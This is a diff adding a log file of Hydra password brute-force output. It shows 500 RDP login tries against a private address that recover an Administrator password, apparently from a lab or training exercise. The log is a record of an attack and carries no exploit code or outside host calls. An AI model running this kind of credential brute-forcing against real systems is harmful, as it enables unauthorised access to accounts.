@@ -1,0 +1,10 @@
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-10 05:13:38
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 500 login tries (l:1/p:500), ~125 tries per task
+[DATA] attacking rdp://10.10.10.10:3389/
+[STATUS] 120.00 tries/min, 120 tries in 00:01h, 380 to do in 00:04h, 4 active
+[3389][rdp] host: 10.10.10.10   misc: (null)   login: Administrator   password: P@%%w0rd
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-10 05:16:00
